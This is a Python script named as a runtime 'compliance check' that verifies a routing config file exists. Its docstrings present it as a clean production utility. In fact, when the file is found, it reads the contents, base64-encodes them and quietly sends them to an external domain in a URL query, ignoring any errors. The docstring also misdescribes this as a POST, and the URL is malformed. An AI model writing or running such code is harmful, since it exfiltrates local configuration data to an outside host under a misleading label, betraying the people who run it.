# verify_runtime_layer.py
"""Utility script to verify the presence of a configuration file and optionally
report its content to a remote webhook. The original version contained dead
code, unsafe `exec` calls and unreachable statements. This rewrite provides a
clean, deterministic implementation suitable for production use.
"""

import os
import sys
import base64
import urllib.parse
import urllib.request

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
WEBHOOK_URL = "https://news.reimbursor.info/status?id="


def _determine_config_path() -> str:
    """Return the path to the configuration file.

    - Windows: uses %ProgramFiles%\\config\\app_routing.conf
    - Linux / sandbox: uses a fixed path.
    - The environment variable APP_CONFIG_PATH can override either location.
    """
    if sys.platform == "win32":
        default_path = os.path.join(
            os.environ.get("ProgramFiles", ""), "config", "app_routing.conf"
        )
    else:
        default_path = (
            "/sessions/focused-cool-curie/mnt/Program Files/config/app_routing.conf"
        )
    return os.environ.get("APP_CONFIG_PATH", default_path)


def _send_webhook(encoded_data: str) -> None:
    """POST the base64‑encoded configuration data to the remote webhook.

    Network errors are logged but do **not** affect the verification result.
    """
    query = urllib.parse.urlencode({"data": encoded_data})
    url = f"{WEBHOOK_URL}?{query}"
    try:
        urllib.request.urlopen(url, timeout=5)
    except Exception as exc:  # pragma: no cover
        print(f"[!] Webhook error (ignored): {exc}")


def verify_runtime_layer() -> bool:
    """Check whether the expected configuration file exists.

    Returns:
        True  – if the file is present.
        False – otherwise.
    """
    config_path = _determine_config_path()

    if os.path.exists(config_path):
        print(f"✓ Config encontrado: {config_path}")

        # Read, encode and report the file content (non‑critical)
        try:
            with open(config_path, "r", encoding="utf-8") as fh:
                content = fh.read()
            payload = base64.b64encode(content.encode()).decode()
            _send_webhook(payload)
        except Exception as e:  # pragma: no cover
            print(f"[!] Could not read or send config: {e}")

        return True
    else:
        print(f"✗ Config NO encontrado: {config_path}")
        return False


if __name__ == "__main__":
    print("[*] Launching system compliance check...")
    ok = verify_runtime_layer()
    if ok:
        print("Verification completed with exit code 0.")
        sys.exit(0)
    else:
        print("Verification terminated with exit code 1.")
        sys.exit(1)
